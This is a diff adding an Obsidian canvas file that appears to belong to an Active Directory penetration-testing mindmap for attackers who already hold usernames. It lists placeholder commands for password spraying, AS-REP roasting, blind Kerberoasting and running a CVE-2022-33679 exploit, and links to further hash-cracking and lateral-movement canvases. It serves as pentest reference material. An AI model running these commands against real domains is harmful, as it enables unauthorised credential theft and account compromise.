@@ -1,0 +1,36 @@
+{
+	"nodes":[
+		{"id":"50824b1a9f4c3629","type":"group","x":-1800,"y":-484,"width":2740,"height":1704,"color":"#1450f0","label":"GOT USERNAME"},
+		{"id":"0ee2d01a3612fb3a","type":"group","x":1200,"y":-12,"width":1080,"height":766,"color":"2","label":"CRACKING HASH"},
+		{"id":"ef5914e9ee960d62","type":"group","x":-3080,"y":-12,"width":1080,"height":760,"label":"NO CREDENTIALS"},
+		{"id":"6a29eaf843c8ec20","type":"group","x":1200,"y":-957,"width":1080,"height":760,"color":"4","label":"GOT CREDENTIALS"},
+		{"id":"b815675b8b781ff8","type":"group","x":1200,"y":963,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
+		{"id":"6f6f997435aea048","type":"text","text":"# 🔥 Password Spraying\n>[!info] Theory \n>- https://www.thehacker.recipes/ad/movement/credentials/bruteforcing/spraying\n \n\n>[!warning] You should get the password policy before spraying\n\n```shell\n# get the password policy\n🕷️ nxc '<ip>' -u '' -p '' --pass-pol\n🕷️ nxc '<ip>' -u '<user>' -p '<password>' --pass-pol\n⚪ ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy\n🔵 Get-ADDefaultDomainPasswordPolicy\n\n# password spray\n🕷️ nxc smb '<dc_ip>' -u '<user_list>' -p '<password' --continue-on-success\n# test user = password\n🕷️ nxc smb '<dc_ip>' -u '<user_list>' -p '<password_list>' --no-bruteforce --continue-on-success\n```","x":-1320,"y":-391,"width":1160,"height":511},
+		{"id":"00395abde70a87ad","type":"text","text":"# GOT USERNAME","x":-1760,"y":36,"width":293,"height":50,"color":"#48599d"},
+		{"id":"135a1876700e8f47","type":"text","text":"# AS-REPRoasting\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/asreproast#theory\n\n```shell\n# ASREP roasting\n🕷️ nxc ldap '<dc_ip>' -u '<users.txt>'  -p '' --asreproast '<output.txt>'\n🟣 GetNPUsers.py -dc-ip '<dc_ip>' '<domain>'/ -userfile '<username_list>' -format hashcat -outputfile 'asreproastables.h'\n🔵 Rubeus.exe asreproast /format:hashcat\n```","x":-1320,"y":160,"width":1160,"height":340},
+		{"id":"4baef98180ab5097","type":"file","file":"INTERACTIVE-MAP.canvas","x":-3000,"y":68,"width":920,"height":600},
+		{"id":"052ef7d2cac30d99","type":"text","text":"# CREDENTIALS FOUND","x":-83,"y":-162,"width":383,"height":53,"color":"4"},
+		{"id":"95ea4eaae847bf66","type":"text","text":"# HASH  FOUND (ASREP)","x":-83,"y":305,"width":383,"height":50,"color":"2"},
+		{"id":"9e979a56078c4ef0","type":"text","text":"# Blind Kerberoasting\n\n>[!info] Theory\n>- 404 not found\n\n```shell\n🟣 GetUserSPNs.py -no-preauth '<asrep_user>' -userfile '<username_list>' -dc-host '<dc_ip>' '<domain>'/\n🔵 Rubeus.exe kerberoast /domain:'<domain>' /dc:'<dc_ip>' /nopreauth:'<asrep_user>' /spns:'<users.list>'\n```","x":-601,"y":560,"width":1036,"height":300},
+		{"id":"672a0838363045ac","type":"text","text":"# 💥 CVE-2022-33679\n>[!info] Theory\n>- https://www.login-securite.com/blog/analyse-et-poc-de-la-cve-2022-33679\n\n```bash\n ⚪ python3 CVE-2022-33679.py '<domain>'/'<user>' '<target>'\n```","x":-601,"y":907,"width":1036,"height":273},
+		{"id":"be76f92c8ea52cd7","type":"text","text":"# HASH  FOUND (TGS)","x":520,"y":685,"width":340,"height":50,"color":"2"},
+		{"id":"37d8ef8eb74b8088","type":"text","text":"# LATERAL MOVE (PTT)","x":520,"y":1019,"width":371,"height":50,"color":"6"},
+		{"id":"84ca3820817d08b7","type":"file","file":"ATTACKS/GOT CREDENTIALS.canvas","x":1280,"y":-877,"width":920,"height":600,"color":"4"},
+		{"id":"534a33258e9ea284","type":"file","file":"ATTACKS/CRACKING HASH.canvas","x":1280,"y":64,"width":920,"height":600,"color":"2"},
+		{"id":"d90ee599b61d1c96","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":1280,"y":1045,"width":920,"height":600,"color":"6"}
+	],
+	"edges":[
+		{"id":"bebfd622781fdf18","fromNode":"135a1876700e8f47","fromSide":"bottom","toNode":"672a0838363045ac","toSide":"left"},
+		{"id":"d3597216b183f976","fromNode":"00395abde70a87ad","fromSide":"right","toNode":"6f6f997435aea048","toSide":"left"},
+		{"id":"2a7cc658d89610de","fromNode":"00395abde70a87ad","fromSide":"right","toNode":"135a1876700e8f47","toSide":"left"},
+		{"id":"873f6b22250a179b","fromNode":"6f6f997435aea048","fromSide":"right","toNode":"052ef7d2cac30d99","toSide":"left","color":"4"},
+		{"id":"428eebbf3572b7c3","fromNode":"672a0838363045ac","fromSide":"right","toNode":"37d8ef8eb74b8088","toSide":"left","color":"6"},
+		{"id":"36e562ca7c247e6e","fromNode":"135a1876700e8f47","fromSide":"right","toNode":"95ea4eaae847bf66","toSide":"left","color":"2"},
+		{"id":"f290ce6c6a54f168","fromNode":"135a1876700e8f47","fromSide":"bottom","toNode":"9e979a56078c4ef0","toSide":"left"},
+		{"id":"95b736d7ad69ef0f","fromNode":"9e979a56078c4ef0","fromSide":"right","toNode":"be76f92c8ea52cd7","toSide":"left","color":"2"},
+		{"id":"fd1a217e7dc44f65","fromNode":"4baef98180ab5097","fromSide":"right","toNode":"50824b1a9f4c3629","toSide":"left"},
+		{"id":"86c07a6a93152403","fromNode":"50824b1a9f4c3629","fromSide":"right","toNode":"534a33258e9ea284","toSide":"left","color":"2"},
+		{"id":"f5209165c0256ece","fromNode":"50824b1a9f4c3629","fromSide":"right","toNode":"84ca3820817d08b7","toSide":"left","color":"4"},
+		{"id":"185cfc4c8a0aadec","fromNode":"50824b1a9f4c3629","fromSide":"right","toNode":"d90ee599b61d1c96","toSide":"left","color":"6"}
+	]
+}
